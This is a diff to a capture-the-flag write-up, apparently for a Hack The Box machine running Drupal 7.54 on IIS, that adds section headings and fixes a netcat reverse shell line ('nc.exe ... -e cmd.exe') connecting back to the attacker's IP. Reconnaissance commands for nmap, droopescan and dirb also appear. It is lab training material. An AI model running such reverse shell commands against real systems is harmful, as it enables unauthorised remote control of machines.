@@ -75,10 +75,14 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 69.71 seconds
 ```
+## Enumeration
+
+### Discovery
+
 On learning that the server is running IIS 7.5 which with a quick google search can reveal that it means it is most likely running on ```Windows Server 2008 R2```
 
 **Please note that gobuster doesnot fare well with this box,so I used dirb. Also, I will be running a scanner for this particular cms known as droopescan which also takes hours.**
-
+### Droopescan
 ```zsh
  droopescan scan drupal -u http://10.10.10.9/
 
@@ -122,6 +126,8 @@ On learning that the server is running IIS 7.5 which with a quick google search 
 ```
 
 On visiting the page: *http://10.10.10.9/CHANGELOG.txt*, we come to know that the Drupal version is 7.54. Before we start looking for exploits, just start a dirb scan in the meanwhile.
+
+### Directory Fuzzing
 
 ```zsh
  dirb http://10.10.10.9/
@@ -257,7 +263,7 @@ Execute the nc.exe to connect back with the windows shell.
 Always try to encode it using URL encoder or Burp encoder. Sometimes browser fails to do so properly and you will not have shell back.
 
 ```console
-nc.exe 10.10.14.9:80 443 -e cmd.exe 
+nc.exe 10.10.14.9 443 -e cmd.exe 
 ```
 ![Running nc.exe ](./images/getting_shellback.png)
 
